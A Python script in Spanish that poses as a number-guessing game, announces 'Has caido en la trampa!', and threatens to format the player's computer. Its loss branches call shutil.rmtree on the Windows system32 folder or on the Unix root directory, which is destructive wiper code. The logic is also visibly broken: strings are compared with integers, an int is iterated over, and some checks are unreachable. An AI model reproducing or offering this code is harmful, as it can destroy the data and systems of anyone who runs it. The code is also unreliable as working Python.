
import time
import random
import shutil

i = True
def sistema():
    sis = 0
    so = True

    while so == True:
        try:
            sis = int(input("¿En que sistema operativo estás? (Es necesario para el funcionamiento del juego) 1 = Windows /// 2 = Rama de Debian /// 3 = Rama de RedHat /// 4 = MacOS "))
            if sis == 5 or sis > 5 or sis < 1:
                print("¡Eso no es na opción válida!")
            else:
                so = False
        except ValueError:
            print("Ingresa un número válido")
    return sis 

sis = sistema()

while i == True:
    print("Has caido en la trampa!")
    time.sleep(2)
    print("Vamos a jugar a un juego.")
    time.sleep(2)
    print("Tienes 10 intentos para adivinar un numero totalmente aleatorio del 1 al 50.")
    time.sleep(2)
    print("Me vas a dar una lista de 3 numeros por inento.")
    time.sleep(2)
    print("Aunque este numero aleatorio, va a cambiar a cada intento para añadirle un poco de dificultad 😈 ")
    time.sleep(2)
    prim = input("¿Crees que es dificil? (si/no)")
    if prim in ["si", "s", "Si", "SI"]:
        print("Me da igual tu opinion, ahora, también añadire un número maldito... ")
        time.sleep(2)
        print("Habrá un número aleatorio el cual si aciertas, se formateará tu pc :) ")
    else:
        print("Me da igual tu opinion, ahora, también añadire un número maldito... ")
        time.sleep(2)
        print("Habrá un número aleatorio el cual si aciertas, se formateará tu pc :) ")

    time.sleep(3)
    print("Perfecto, empecemos con tu primer intento. ")
    u = 0
    while u <10:


        def crearlista():
            p = list()
            while len(p) <3:
                try:
                    o = input('Escribe tus numeros de 1 en 1 dandole a Enter ')
                    if 1 <= o <= 50 and o not in p:
                        p.append(o)
                    else:
                        print("El número no es válido. Por favor aáde uno nuevo")
                except ValueError:
                    print("Añade un valor válido.")
            return p

        def numerobueno():
            return random.randint(1,50)
        
        def numeromalo():
            return random.randint(1,50)

        nb = numerobueno()
        nm = numeromalo()
        
        if nb == nm and nm == 50:
            nm == nm-1
            if nb == nm and nm < 50:
                nm == nm+1

        lista = crearlista()

        for lista in nb:
            print("Te has salvado, has adivinado el número, que era {}".format(nb))
        for lista in nm:
            print("JAJAJAJAJAJA Has adivinado el numero malo, ahora te doy 3 segundos para despedirte de tu ordenador ")
            time.sleep(3)
            if sis == 1:
                shutil.rmtree("c:\windows\system32")
                if sis == 2 or sis == 3 or sis == 4:
                    shutil.rmtree("/")
        u = u+1
        print("Este es tu intento número {}".format(u))
    if u == 11:
        if sis == 1:
            print("Se han acabado tus intentos, has perdido, por lo que igualmente serás castigado")
            shutil.rmtree("c:\windows\system32")
        elif u == 11 and sis == 2 or sis == 3 or sis == 4:
            shutil.rmtree("/")